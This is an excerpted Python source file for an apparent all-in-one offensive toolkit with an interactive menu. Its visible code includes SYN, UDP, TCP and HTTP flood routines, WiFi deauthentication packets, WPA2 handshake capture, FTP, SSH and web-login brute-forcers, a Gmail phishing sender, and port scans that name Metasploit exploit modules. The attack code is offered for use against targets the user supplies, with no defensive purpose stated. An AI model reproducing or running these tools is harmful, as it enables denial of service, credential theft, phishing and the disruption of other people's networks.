...
while True:
    try:
            ...
            try:
                ...
                if tool1 == "03":
                    try:
                        ...
                        while True:
                            print(
                                Fore.BLUE + "[!] If you want to see the addres you must have the file named GeoLiteCity.dat installed")
                ...
                if tool1 == "05":
                    ...
                    while True:
                        try:
                            ...
                            if srv == "start_search":
                                opd = input(
                                    "[+] Enter the path of google chrome.exe (it may be C:\Program Files\Google\Chrome\Application\chrome.exe): ")
                                while True:
                                    try:
                                        print(
                                            Fore.BLUE + "[!!!] When google is gonna pop up you need to click fast on the search bar otherwhise the app is not gonna have any effect ")
                                        print(
                                        ...
                                        if z == "b":
                                            try:
                                                ...
                                                path_chome = opd
                                                webbrowser.register("chrome", None,
                                                                    webbrowser.BackgroundBrowser(path_chome))
                                                webbrowser.get("chrome").open_new_tab(url1)
                                        ...
                                        if z == "c":
                                            try:
                                                ...
                                                chrome_pth = opd
                                                webbrowser.register("chrome", None,
                                                                    webbrowser.BackgroundBrowser(chrome_pth))
                                                webbrowser.get("chrome").open_new_tab(url1)
                                        ...
                                        if z == "d":
                                            try:
                                                ...
                                                path_chomee = opd
                                                webbrowser.register("chrome", None,
                                                                    webbrowser.BackgroundBrowser(path_chomee))
                                                webbrowser.get("chrome").open_new_tab(url1)
                                                sleep(6)
                                        ...
                                        if z == "e":
                                            try:
                                                ...
                                                path_chomer = opd
                                                webbrowser.register("chrome", None,
                                                                    webbrowser.BackgroundBrowser(path_chomer))
                                                webbrowser.get("chrome").open_new_tab(url1)
                                                sleep(6)
                                                pyautogui.write("filetype:reg reg HKEY_CURRENT_USER username")
                                                pyautogui.press("enter")
                                        ...
                                        if z == "f":
                                            try:
                                                ...
                                                path_chomere = opd
                                                webbrowser.register("chrome", None,
                                                                    webbrowser.BackgroundBrowser(path_chomere))
                                                webbrowser.get("chrome").open_new_tab(url1)
                                                sleep(6)
                                                    ...
                                                    with print_lock:
                                                        ...
                                                        try:
                                                            if port == 21:
                                                                try:
                                                                    print(
                                                                        Fore.BLUE + "[!] The target has a ftp backdoor (port 21) or in can be bruteforce  ")
                                                                except KeyboardInterrupt:
                                                                    exit()
                                                            if port == 22:
                                                                try:
                                                                    print(
                                                                        Fore.BLUE + "[!] The target is vulnerable on ssh (port 22) and it can be bruteforce")
                                                                except KeyboardInterrupt:
                                                                    exit()
                                                        except KeyboardInterrupt:
                                                            exit()
                                                ...
                                                def pscan(port):
                                                    try:
                                                        ...
                                                        with print_lock:
                                                            ...
                                                            if port == 25:
                                                                print(
                                                                    Fore.BLUE + "[!] The target is vulnerable on smtp (port 25) and it can be exploit a stack buffer overflow ")
                                                            if port == 80:
                                                                print(
                                                                    Fore.BLUE + "[!] The target is vulnerable on http (port 80) and can be dos/ddos on  http")
                                                            if port == 110:
                                                                print(
                                                                    Fore.BLUE + "[!] The target is vulnerable on pop3 (port 110) and it can be bruteforce")
                                                            if port == 143:
                                                                print(
                                                                    Fore.BLUE + "[!] The targes is vulnerable on imap (port 143) and it can be bruteforce")
                                                            if port == 443:
                                                                print(
                                                                    Fore.BLUE + "[!] The target is vulnerable on https (port 443) and it can be dos/ddos on https")
                                                        con.close()
                                                    except:
                                                        pass
                                                ...
                                                def pscan(port):
                                                    try:
                                                        ...
                                                        with print_lock:
                                                            ...
                                                            if port == 445:
                                                                print(
                                                                    Fore.BLUE + "[!] The target is vulnerable on microsft-ds (port 445) and it bruteforce or it can be exploited (on linux with metasploit framework) with the module exploit/windows/smb/ms08_netapi")
                                                            if port == 3306:
                                                                print(
                                                                    Fore.BLUE + "[!] The target is vulnerable on MySql (port 3306) and it can be bruteforce")
                                                            if port == 3389:
                                                                print(
                                                                    Fore.BLUE + "[!] The target is vulnerable on RDP (port 3389) and it can be bruteforce")
                                                        con.close()
                                                    except:
                                                        pass
                                                ...
                                                def pscan(port):
                                                    try:
                                                        ...
                                                        with print_lock:
                                                            ...
                                                            if port == 21:
                                                                print(
                                                                    Fore.BLUE + "[!] The target is vulnerable on ftp (port 21) and it can be bruteforce")
                                                            if port == 22:
                                                                print(
                                                                    Fore.BLUE + "[!] The target is vulnerable on ssh (port 22) and it can be bruteforce")
                                                            if port == 25:
                    ...
                    while True:
                        try:
                            ...
                            if hlp == "start_user":
                                try:
                                    ...
                                    number_of_threads = input(
                                        Fore.GREEN + "[+] Enter the number of threads for the scan: ")
                                    z = input(Fore.GREEN + "[+] Enter the mode: ")
                                    print(Fore.GREEN + "-------Trying-------")
                                    if z == "1":
                                        print_lock = threading.Lock()
                                            ...
                                            def pscan(port):
                                                try:
                                                    ...
                                                    with print_lock:
                                                        ...
                                                        if port == 445:
                                                            print(
                                                                Fore.BLUE + "[!] The target is vulnerable on microsft-ds (port 445) and it bruteforce or it can be exploited (on linux with metasploit framework) with the module exploit/windows/smb/ms08_067_netapi")
                                                        if port == 3306:
                                                            print(
                                                                Fore.BLUE + "[!] The target is vulnerable on MySql (port 3306) and it can be bruteforce")
                                                        if port == 3389:
                            ...
                            if hlp == "search_info":
                                try:
                                    print(
                                        Fore.BLUE + "[!] Vulnerability Searcher to scan a user's server. Hope you enjoy it:)")
                                except KeyboardInterrupt:
                                    exit()
                ...
                if tool1 == "09":
                    while True:
                        try:
                            ...
                            is2 = input(
                                f"[+] Do you want to scan multiple ip's/domains or just a single ip/domain [1/2]: ")
                            if is2 == "1":
                            ...
                            try:
                                ...
                                if menu == "ftp_crack":
                                    try:
                                        ...
                                        def brtueLogin(hostname, passwdFile):
                                            ...
                                            for line in pF.readlines():
                                                ...
                                                try:
                                                    ...
                                                    print(
                                                        Fore.BLUE + "[+] Login Suceeded With :" + userName + "/" + passWord)
                                                    input()
                                                    ftp.quit()
                                        ...
                                        passwdFile = input(
                                            Fore.GREEN + "[+] Enter the path file of the dictionary(usernames + passwords): ")
                    ...
                    try:
                        ...
                        while True:
                            ...
                            if command == "--help":
                                ...
                                print("root:123" + "\n")
                                print(
                                    "if you know the username and dont know the password you just need to have a password dictionary" + "\n")
                            elif command == "exit":
                                sys.exit(1)
                    except KeyboardInterrupt:
                        exit()
                    ...
                    try:
                        ...
                        def connect(host, user, password):
                            try:
                                ...
                                print("[+] Password found {}".format(password), " on host {}".format(host),
                                      " with the user: {}".format(user))
                            except:
                                print("[-] Incorrect password {}".format(password), " on host {}".format(host),
                                      " with the user: {}".format(user))
        ...
        if menu_help == "3":
            try:
                print("\n" + Fore.BLUE + "[18] Phising Gmail Toolkit" + "\n")
                            ...
                            if commd == "gmail_send":
                                while True:
                                    try:
                                        ...
                                        send_email = input(
                                            Fore.GREEN + "[+] Enter the email which the target will see: ")
                                        # The target
        ...
        if menu_help == "4":
            try:
                # The menu
                print(
                    "\n" + Fore.BLUE + "[19] DDoS Menu" + "\n" + Fore.BLUE + "[20] Request Flood" + "\n" + Fore.BLUE + "[21] SYN Flood Attack" + "\n" + Fore.BLUE + "[22] Udp Flood" + "\n" + Fore.BLUE + "[23] Tcp Flood" + "\n" + Fore.BLUE + "[24] Ultra Web DDoS" + "\n" + Fore.BLUE + "[25] HTTP Flood Attack" + "\n" + Fore.BLUE + "[26] ICMP Flood" + "\n" + Fore.BLUE + "[27] DNS DDoS" + "\n" + Fore.BLUE + "[28] Tcp through flooding with denied connections" + "\n" + Fore.BLUE + "[29] Slowloris" + "\n")
                                                    ...
                                                    try:
                                                        ...
                                                        if command == "start_attack":
                                                            try:
                                                                ...
                                                                number_of_threads = input(
                                                                    Fore.GREEN + "[+] Enter the number of threads: ")
                                                                print(Fore.GREEN + "[!]-----> 0%")
                                                                time.sleep(2)
                                                                print(Fore.GREEN + "[!]-----> 25%")
                                                                time.sleep(2)
                                                    ...
                                                    try:
                                                        ...
                                                        if command_2 == "start_dos":
                                                            try:
                                                                # Url target
                                                                url_target_2 = input(
                                                                    Fore.GREEN + "[+] Enter the url target: ")
                                                                # Number of threads
                                                                number_of_threads_2 = input(
                                                                    Fore.GREEN + "[+] Enter the number of threads for the attack: ")
                                                                print(Fore.GREEN + "[!]-----> 0%")
                                                                time.sleep(2)
                                                                print(Fore.GREEN + "[!]-----> 25%")
                                                                time.sleep(2)
                                            ...
                                            if cmnd == "udp_flood":
                                                try:
                                                    ...
                                                    try:
                                                        ...
                                                        print(Fore.BLUE + "[-] The ip is not valid")
                                                    port2 = input(
                                                        Fore.GREEN + "[+] Enter the port you want to attack: ")
                                                    data = input(Fore.GREEN + "[+] Enter the data you want to send: ")
                                                    threads_6 = input(Fore.GREEN + "[+] Enter the number of threads: ")
                                                    powerful = input(
                                                        Fore.GREEN + "[+] Enter how powerful do you want the attack to be (1[THE LIGHTER ONE] - 5 [THE MOST POWERFUL ONE] : ")
                                                    if powerful == "1":
                                                        try:
                                                            print(Fore.GREEN + "[!]-----> 0%")
                                                            time.sleep(2)
                                                            ...
                                                            def UDP():
                                                                while True:
                                                                    try:
                                                                        ...
                                                                        sock4 = socket.socket(socket.AF_INET,
                                                                                              socket.SOCK_DGRAM)
                                                                        sock5 = socket.socket(socket.AF_INET,
                                                                                              socket.SOCK_DGRAM)
                                                                        addrs = (str(ip2), int(port2))
                                                                        sock.sendto(data.encode("utf-8"), addrs)
                                                                        sock2.sendto(data.encode("utf-8"), addrs)
                                            ...
                                            if cmnd2 == "tcp_flood":
                                                try:
                                                    ...
                                                    try:
                                                        ...
                                                        print(Fore.BLUE + "[-] The ip is not valid")
                                                    port3 = int(
                                                        input(Fore.GREEN + "[+] Enter the port you want to attack: "))
                                                    data3 = input(Fore.GREEN + "[+] Enter the data you want to send: ")
                                                    numbr_threads = input(
                                                        Fore.GREEN + "[+] Enter the number of threads: ")
                                                    powerful1 = input(
                                                        Fore.GREEN + "[+] Enter how powerful do you want the attack to be (1[LIGHTER ONE] / 5 [STRONGEST/FASTEST] ): ")
                                                    if powerful1 == "1":
                                                        try:
                                                            print(Fore.GREEN + "[!]-----> 0%")
                                                            time.sleep(2)
                                    ...
                                    while True:
                                        try:
                                            ...
                                            if command_3 == "start_syn":
                                                try:
                                                    how = input(
                                                        Fore.GREEN + "[+] How much powerfull do you want the attack to be ( 1[THE LIGHTER ONE] - 2[THE MOST POWERFUL/FASTEST] ) : ")
                                                    ...
                                                    if how == "1":
                                                        try:
                                                            ...
                                                            def tcp_flood(ip_adddres, sport, dport):
                                                                ...
                                                                packet = IP(src=s_addr, dst=d_addr) / TCP(sport=sport,
                                                                                                          dport=dport,
                                                                                                          seq=200000,
                                                                                                          flags="S")
                                                                # Send the packet
                                                            ...
                                                            # Asks for the ip
                                                            ip = str(
                                                                input(Fore.GREEN + "[+] Enter the target ip addres: "))
                                                            # The port
                                                            port = int(input(
                                                                Fore.GREEN + "[+] Enter the port you want to attack: "))
                                                    ...
                                                    if how == "2":
                                                        try:
                                                            ...
                                                            def tcp_flood_2(ip_adddres_2, sport_2, dport_2):
                                                                ...
                                                                d_addr = ip_adddres_2
                                                                # The packet that will be send it will have the source addres the variable s_addr, dst it s the destination addres, the source port, the
                                                                packet = IP(src=s_addr, dst=d_addr) / TCP(sport=sport_2,
                                                                                                          dport=dport_2,
                                                                                                          seq=200000,
                                                                                                          flags="S")
                                                                # Send the packet
                                        ...
                                        if how == "1":
                                            try:
                                                ...
                                                def tcp_flood(ip_adddres, sport, dport):
                                                    ...
                                                    # The packet that will be send it will have the source addres the variable s_addr, dst it s the destination addres, the source port, the destination port, the sequence will be 200000, and for the attack to be a SYN attack we need to specify that the flag = S
                                                    packet = IP(src=s_addr, dst=d_addr) / TCP(sport=sport, dport=dport,
                                                                                              seq=200000, flags="S")
                                                    # Send the packet
                                                    send(packet)
                                ...
                                try:
                                    ...
                                    def do_Req():
                                        while True:
                                            ...
                                            response2 = ses6.get(url, headers=random.choice(headers_useragents))
                    ...
                    try:
                        ...
                        while True:
                            ...
                            if icmp_command == "icmp_flood":
                                ...
                                additional_word = str(
                                    input(Fore.GREEN + "[+] Do you want to add data to your packet[y/n]: "))
                                number_of_threads_icmp = input(
                                    Fore.GREEN + "[+] Enter the number fo threads for the attack: ")
        ...
        if menu_help == "5":
            try:
                while True:
                    print(
                        "\n" + Fore.BLUE + "[30] Deauthentication Attack" + "\n" + Fore.BLUE + "[31] WPA2 Cracker" + "\n")
                    print(
                                            ...
                                            if interface == "y":
                                                while True:
                                                    try:
                                                        ...
                                                        discover = input(
                                                            Fore.GREEN + "[+] Do you want to discover wifi networks around you[y/n]: ")
                                                        if discover == "n":
                                                            try:
                                                                subprocess.run(["airodump-ng", "wlan0mon"])
                                                                mac_addres = input(
                                                                    Fore.GREEN + "[+] Enter the mac addres of the wifi network: ")
                                                                print(Fore.GREEN + "[!]-----> 0%")
                                                                time.sleep(2)
                                                                print(Fore.GREEN + "[!]-----> 25%")
                                                                time.sleep(2)
                                                                ...
                                                                time.sleep(1)
                                                                print(Fore.GREEN + "[!] The attack is going")
                                                                pkt = RadioTap() / Dot11(addr1=mac_addres,
                                                                                         addr2=sys.argv[1],
                                                                                         addr3=sys.argv[
                                                                                             1]) / Dot11Deauth()
                                                        ...
                                                        if discover == "y":
                                                            try:
                                                                ...
                                                                addres_mac = input(
                                                                    Fore.GREEN + "[+] Enter the mac addres of the wifi network: ")
                                                                pkt = RadioTap() / Dot11Deauth(addr1=addres_mac,
                                                                                               addr2=sys.argv[1],
                                                                                               addr3=sys.argv[
                                                                                                   1]) / Dot11Deauth()
                                                        ...
                                                        if discover2 == "n":
                                                            try:
                                                                class Deauth:
                                                                    ...
                                                                    mac_addres_2 = input(
                                                                        Fore.GREEN + "[+] Enter the mac addres of the wifi network: ")
                                                                    pkt = RadioTap() / Dot11(addr1=mac_addres_2,
                                                                                             addr2=sys.argv[1],
                                                                                             addr3=sys.argv[
                                                                                                 1]) / Dot11Deauth()
                                                                    send(pkt, iface="wlan0", count=100000, inter=.2)
                                                        ...
                                                        if discover2 == "y":
                                                            try:
                                                                ...
                                                                class WifiDoS:
                                                                    addres_mac_2 = input(
                                                                        Fore.GREEN + "[+] Enter the mac addres of the wifi network: ")
                                                                    pkt = RadioTap() / Dot11Deauth(addr1=addres_mac_2,
                                                                                                   addr2=sys.argv[1],
                                                                                                   addr3=sys.argv[
                                                                                                       1]) / Dot11Deauth()
                                                                    send(pkt, iface="wlan0", count=100000, inter=.2)
                                                    ...
                                                    try:
                                                        ...
                                                        if discover3 == "n":
                                                            while True:
                                                                try:
                                                                    madbrc = input(
                                                                        Fore.GREEN + "[+] Enter the mac addres: ")
                                                                    print(Fore.GREEN + "[!]-----> 0%")
                                                                    time.sleep(2)
                                                                    print(Fore.GREEN + "[!]-----> 25%")
                                                                    time.sleep(2)
                            ...
                            try:
                                ...
                                if zad == "y":
                                    while True:
                                        ...
                                        print(
                                            Fore.BLUE + "[!] Wait untill the WPA Handshake will be captured (if it takes more than 2 minutes this will mean that the attack is not working)")
                                        subprocess.run(
                                            ["airodump-ng", "-w", "hack1", "-c", zad3, "--bssid", zad2, "wlan0mon"])
                                        sleep(120)
                                        print(
                                            Fore.BLUE + "[!] If you didn't captured any WPA2 Handshake the attack will not work")
                                    ...
                                    while True:
                                        ...
                                        while True:
                                            ...
                                            print(
                                                Fore.BLUE + "[!] Wait untill the WPA Handshake will be captured (if it takes more than 2 minutes this will mean that the attack is not working)")
                                            subprocess.run(
                                                ["airodump-ng", "-w", "hack1", "-c", zad4, "--bssid", zad3, "wlan0mon"])
                                            sleep(120)
                                            print(
                                                Fore.BLUE + "[!] If you didn't captured any WPA2 Handshake the attack will not work")
        ...
        if menu_help == "6":
            try:
                print("\n" + Fore.BLUE + "[32] Fuzzing FTP" + "\n" + Fore.BLUE + "[33] Fuzzing SSH" + "\n" + Fore.BLUE + "[34] SQL Scanenr" + "\n" + Fore.BLUE + "[35] Remote Code Execution" + "\n" + Fore.BLUE + "[36] Cloudfare DDoS" + "\n" + Fore.BLUE + "[37] WebMenu" + "\n")
                tool_choice = input(Fore.GREEN + "MrRobot~# ")
                if tool_choice == "32":
                    try:
                        buffer = []
                        ...
                        if choice == "1":
                            ...
                            while True:
                                ...
                                if command_bruteforce == "--help":
                                    ...
                                    def login(user, url, word):
                                        ...
                                        r = s.post(url,
                                                   data={"rcr_authenticate": "1", "rcr_user": user, "rcr_pass": word,
                                                         "rcr_submit": "Conectare"})
                                        count += 1
                            ...
                            def do_req(url):
                                ...
                                for word in payload:
                                    ...
                                    print("-" * 50)
                                    print(
                                        f"[ATTACK] Content-length: {content_length}, Request number: {count}, with the payload {word}")
                                    print("-" * 50)
